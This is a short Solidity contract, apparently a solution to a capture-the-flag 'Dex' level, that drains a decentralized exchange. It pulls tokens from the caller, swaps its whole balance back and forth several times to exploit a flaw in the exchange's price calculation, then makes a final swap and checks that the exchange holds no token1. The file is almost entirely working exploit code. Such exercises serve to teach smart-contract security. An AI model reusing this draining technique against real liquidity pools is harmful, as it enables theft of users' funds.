// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/dex.sol';
import "OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol";
import "OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/ERC20.sol";
import 'OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/access/Ownable.sol';

contract AttackDex {
    Dex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(Dex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }

    function pwn() public {
        
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // token1.approve(address(dex), type(uint256).max);
        // token2.approve(address(dex), type(uint256).max);

        swap(token1, token2);
        swap(token2, token1);
        swap(token1, token2);
        swap(token2, token1);
        swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
    }



}